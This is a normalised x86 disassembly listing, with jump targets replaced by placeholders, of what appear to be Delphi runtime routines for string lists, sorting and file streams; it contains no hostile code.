mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41d130
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d1d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41fde4
mov eax [ ebp - 0x4 ]
call sub_41c87c
xor eax eax
push ebp
push sub_41d1af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41ee80
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420a84
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1b6
mov eax [ ebp - 0x4 ]
call sub_41c938
retn
sub_41d1e0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41e058
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d22b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d232
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_41d238
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d285
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41de08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d28c
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_41d298
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405b68
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41d2cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d30f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404318
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d316
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_41d31c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d3d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c87c
xor edx edx
push ebp
push sub_41d3b3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3ba
mov eax [ ebp - 0x4 ]
call sub_41c938
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404210
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41d3e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d47c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d483
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404144
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov eax ebx
call sub_41d51c
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404308
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4044a0
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
sub_41d48c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d502
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_421ff0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_421ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d509
lea eax [ ebp - 0xc ]
call sub_404120
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423754
inc esi
dec ebx
jne r-xdata
sub_41d534
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41d550
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c6b4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404bd4
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41d5b8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ca30
jmp r-xdata
sub_41d654
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404bd4
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41d694
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ca30
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4029b0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404cc0
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41d700
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ca30
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41ca30
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41d75c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41d75c
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41d780
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41d7f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ca30
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_404174
pop edi
pop esi
pop ebx
retn
sub_41d834
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ca30
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41d85c
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41d890
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41cd84
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41d8dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ca30
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ca30
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41d930
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41d85c
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_404174
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4029b0
sub_41d9a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ca30
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ca30
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_404174
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41da04
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ca30
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41da44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d75c
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41da44
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41daf4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41db50
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41da44
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41dba4
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41dbd8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41dc3c
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41dc90
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4032e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
mov esp ebp
pop ebp
retn
sub_41dcdc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4032d8
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41dc90
pop ecx
mov eax [ ebx ]
call sub_40331c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41dc90
pop ecx
sub_41dd60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41ddd0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
sub_41de08
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
sub_41de40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41dbc4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027b4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41df1c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df23
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4027d4
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41ddd0
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41de08
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41df34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e608
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41df84
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42063c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df8b
mov eax [ ebp - 0x8 ]
call sub_403390
retn
sub_41df94
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41dff0
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408a20
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e030
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d2e0
pop ebx
pop ebp
retn 0x8
sub_41e058
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41e09c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41e09c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41e1c5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
movzx edx di
mov eax esi
call sub_408944
mov ecx eax
xor edx edx
mov eax ebx
call sub_41df94
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4089c0
mov ecx eax
xor edx edx
mov eax ebx
call sub_41df94
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1cc
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_404144
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408b60
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b430
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408b60
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b430
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
jmp r-xdata
sub_41e1cc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41e1f0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
